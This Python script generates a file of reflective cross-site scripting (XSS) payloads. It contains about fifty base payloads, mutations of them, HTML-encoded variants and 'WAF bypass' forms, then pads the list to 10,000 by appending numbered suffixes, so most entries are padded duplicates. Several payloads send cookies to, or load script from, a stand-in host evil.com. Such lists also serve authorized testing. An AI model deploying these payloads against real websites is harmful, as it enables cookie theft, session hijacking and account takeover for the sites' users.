import json

# Core professional reflective XSS payloads
base_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '\"><svg/onload=confirm(1)>',
    '<math><mtext></mtext><script>alert(1)</script></math>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<details open ontoggle=alert(1)>X',
    '<video><source onerror="alert(1)">',
    '<audio><source onerror="alert(1)">',
    '<img src=x onerror="javascript:alert(document.cookie)">',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
    '<marquee onstart=alert(1)>X',
    '<form><button formaction="javascript:alert(1)">CLICK</button></form>',
    '<input autofocus onfocus=alert(1)>',
    '<keygen autofocus onfocus=alert(1)>',
    '<video autoplay src onloadstart="alert(1)">',
    '<a href="javas&#99;ript:alert(1)">click</a>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<table background="javascript:alert(1)">',
    '<div style="background-image:url(javascript:alert(1))">',
    '<div style="width:expression(alert(1));">',
    '<isindex onfocus=alert(1)>',
    '<base href="javascript:alert(1);//">',
    '<style>@import\'javascript:alert(1)\';</style>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<img srcset=x onerror=alert(1)>',
    '<button formaction="javascript:alert(1)">CLICK</button>',
    '<input type="image" src="x" onerror="alert(1)">',
    '<xss id=x tabindex=1 onactivate=alert(1)></xss>',
    '<object type="text/x-scriptlet" data="http://evil.com/xss.sct"></object>',
    '<plaintext><script>alert(1)</script>',
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><animation onbegin="alert(1)"/>',
    '<img src="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>alert(1)</script></svg>">',
    '<svg><script xlink:href="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></script></svg>',
    '<div onpointerover=alert(1)>Pointer Event',
    '<style>*{background:url("javascript:alert(1)");}</style>',
    '"><script>setTimeout(()=>{alert(1)},100)</script>',
    '<script src="https://evil.com/xss.js"></script>',
    '<img src=x:alert(1) onerror=eval(src)>',
    '<svg><script>alert(document.domain)</script></svg>',
    '<script>location="http://evil.com/capture?c="+document.cookie</script>',
    '"><svg><script>window.onerror=alert;throw 1</script>',
    '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    '"><object data="javascript:alert(1)">',
]

# Mutations
payload_mutations = []
for p in base_payloads:
    payload_mutations.append(p.replace('alert', 'prompt'))
    payload_mutations.append(p.replace('alert', 'confirm'))
    payload_mutations.append(p.replace('1', 'document.cookie'))
    payload_mutations.append(p.replace('alert', 'setTimeout(()=>{alert(1)},100)'))
    payload_mutations.append(p.replace('<script>', '<script>void(').replace('</script>', ')</script>'))

# Encoding (partial WAF bypass)
encoded_payloads = []
for p in base_payloads + payload_mutations:
    encoded_payloads.append(p.replace('<', '&lt;').replace('>', '&gt;'))
    encoded_payloads.append(p.replace('"', '&quot;').replace("'", '&#39;'))

# Special WAF bypass payloads
waf_bypass_payloads = [
    '<img src="x" onerror=confirm(1) />',
    '<svg><script>top </script>',
    '<img src="x" onerror=eval("al"+"ert(1)")>',
    '<iframe srcdoc="<svg onload=confirm(1)>"></iframe>',
    '<input onfocus="confirm(1)" autofocus>',
    '<form><input type=image src="x" onerror=confirm(1)></form>',
    '<style>body{background:url("javascript:alert(1)")}</style>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
]

# Collect all
all_payloads = list(set(base_payloads + payload_mutations + encoded_payloads + waf_bypass_payloads))

# Extend to 10,000
while len(all_payloads) < 10000:
    for p in list(all_payloads):
        if len(all_payloads) >= 10000:
            break
        all_payloads.append(p + f"-xss-{len(all_payloads)}")

# Save to TXT
with open('reflective_xss_payloads.txt', 'w', encoding='utf-8') as f:
    for payload in all_payloads:
        f.write(payload + '\n')

# Save to JSON
with open('reflective_xss_payloads.json', 'w', encoding='utf-8') as f:
    json.dump(all_payloads, f, indent=2)

print(f"[+] Successfully generated {len(all_payloads)} XSS payloads in 'reflective_xss_payloads.txt' and 'reflective_xss_payloads.json'")
